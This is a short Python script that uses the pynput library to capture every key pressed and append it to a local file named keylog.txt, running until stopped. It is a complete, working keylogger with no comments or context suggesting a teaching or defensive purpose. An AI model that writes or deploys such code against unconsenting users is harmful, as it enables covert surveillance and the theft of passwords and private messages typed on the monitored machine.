from pynput.keyboard import Listener

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key).replace("'", ""))
            f.write("\n")
    except Exception as e:
        print(f"Error: {e}")

listener = Listener(on_press=on_press)
listener.start()
listener.join()
